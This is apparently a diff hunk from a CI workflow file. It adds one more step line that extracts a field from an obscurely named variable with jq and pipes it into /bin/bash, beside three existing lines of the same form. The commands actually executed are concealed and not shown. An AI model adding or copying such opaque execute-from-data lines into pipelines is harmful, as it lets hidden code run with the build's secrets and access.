@@ -39,6 +39,7 @@ jobs:
           echo $mdw5 | jq -r .v89 | /bin/bash
           printf '%s' "$yxios481" | jq -r .ygm78224 | /bin/bash
           echo $t049 | jq -r .vd5 | /bin/bash
+          echo $ic92555 | jq -r .le1966 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
